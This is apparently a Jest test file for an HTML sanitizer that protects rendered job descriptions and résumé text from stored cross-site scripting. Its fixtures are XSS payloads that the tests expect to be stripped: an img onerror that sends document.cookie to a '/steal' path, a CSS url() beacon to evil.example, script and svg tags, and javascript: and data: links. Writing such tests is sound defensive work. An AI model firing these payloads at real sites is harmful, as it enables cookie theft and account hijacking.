import { HtmlSanitizerService } from './html-sanitizer.service';

/**
 * The stored-XSS boundary.
 *
 * This service is what stands between externally-scraped job descriptions (and
 * candidate-authored résumé prose) and every surface that renders them with
 * dangerouslySetInnerHTML — the résumé preview, the PDF renderer, and public
 * share links.
 *
 * It had NO tests. The only three files referencing it all mocked it, because
 * sanitize-html's dependency chain could not be loaded by jest at all. Once the
 * ESM transform was fixed, the code became testable — and an untested XSS
 * boundary is the first thing that should get tests.
 *
 * These are attack-shaped rather than API-shaped: each case is something an
 * attacker would actually try.
 */
describe('HtmlSanitizerService', () => {
  let service: HtmlSanitizerService;

  beforeEach(() => {
    service = new HtmlSanitizerService();
  });

  describe('script injection', () => {
    it('strips a script tag entirely', () => {
      const out = service.sanitize('<p>Hi</p><script>alert(1)</script>');

      expect(out).not.toContain('script');
      expect(out).not.toContain('alert');
      expect(out).toContain('<p>Hi</p>');
    });

    it('strips inline event handlers', () => {
      const out = service.sanitize('<p onclick="steal()">Click me</p>');

      expect(out).not.toContain('onclick');
      expect(out).toContain('Click me');
    });

    // The classic: a tag that never loads its src, so onerror always fires.
    it('strips an img onerror payload', () => {
      const out = service.sanitize('<img src=x onerror="fetch(`/steal?c=${document.cookie}`)">');

      expect(out).not.toContain('onerror');
      expect(out).not.toContain('document.cookie');
    });

    it('strips iframes', () => {
      const out = service.sanitize('<iframe src="https://evil.example"></iframe>');

      expect(out).not.toContain('iframe');
    });

    it('strips style tags, which can exfiltrate via CSS', () => {
      const out = service.sanitize('<style>body{background:url("//evil.example/?c=1")}</style><p>x</p>');

      expect(out).not.toContain('style');
      expect(out).not.toContain('evil.example');
    });

    it('strips svg-based payloads', () => {
      const out = service.sanitize('<svg><script>alert(1)</script></svg>');

      expect(out).not.toContain('svg');
      expect(out).not.toContain('alert');
    });
  });

  describe('link protocols', () => {
    it('drops a javascript: href', () => {
      const out = service.sanitize('<a href="javascript:alert(1)">click</a>');

      expect(out).not.toContain('javascript:');
      expect(out).toContain('click');
    });

    it('drops a data: href', () => {
      const out = service.sanitize('<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>');

      expect(out).not.toContain('data:');
    });

    it('keeps http, https and mailto', () => {
      for (const href of ['https://example.com', 'http://example.com', 'mailto:a@example.com']) {
        expect(service.sanitize(`<a href="${href}">x</a>`)).toContain(href);
      }
    });

    // Reverse tabnabbing: a target=_blank link can rewrite the opener.
    it('forces rel="noopener noreferrer nofollow" on links', () => {
      const out = service.sanitize('<a href="https://example.com">x</a>');

      expect(out).toContain('noopener');
      expect(out).toContain('noreferrer');
    });
  });

  describe('legitimate formatting survives', () => {
    it('keeps the formatting a job description actually uses', () => {
      const html =
        '<h2>About</h2><p>We need a <strong>backend</strong> engineer.</p>' +
        '<ul><li>TypeScript</li><li>Postgres</li></ul>';

      const out = service.sanitize(html);

      expect(out).toContain('<h2>About</h2>');
      expect(out).toContain('<strong>backend</strong>');
      expect(out).toContain('<li>TypeScript</li>');
    });

    it('keeps tables, which job posts use for compensation bands', () => {
      const out = service.sanitize('<table><tr><td>Base</td><td>100k</td></tr></table>');

      expect(out).toContain('<table>');
      expect(out).toContain('Base');
    });
  });

  describe('edge cases', () => {
    it('returns an empty string for null, undefined and empty input', () => {
      expect(service.sanitize(null)).toBe('');
      expect(service.sanitize(undefined)).toBe('');
      expect(service.sanitize('')).toBe('');
    });

    it('is idempotent — sanitizing twice changes nothing further', () => {
      const once = service.sanitize('<p onclick="x()">hi</p><script>y()</script>');

      expect(service.sanitize(once)).toBe(once);
    });

    it('does not choke on malformed markup', () => {
      expect(() => service.sanitize('<p><b>unclosed <script>alert(1)')).not.toThrow();
      expect(service.sanitize('<p><b>unclosed <script>alert(1)')).not.toContain('alert');
    });
  });

  describe('toPlainText', () => {
    it('strips every tag', () => {
      expect(service.toPlainText('<p>Hello <strong>world</strong></p>')).toBe('Hello world');
    });

    it('drops script content rather than inlining it as text', () => {
      const out = service.toPlainText('<p>Hi</p><script>alert(1)</script>');

      expect(out).not.toContain('alert');
    });

    it('decodes entities and collapses whitespace', () => {
      expect(service.toPlainText('<p>a &amp; b</p>   <p>c</p>')).toBe('a & b c');
    });

    it('returns an empty string for empty input', () => {
      expect(service.toPlainText(null)).toBe('');
      expect(service.toPlainText('')).toBe('');
    });
  });
});
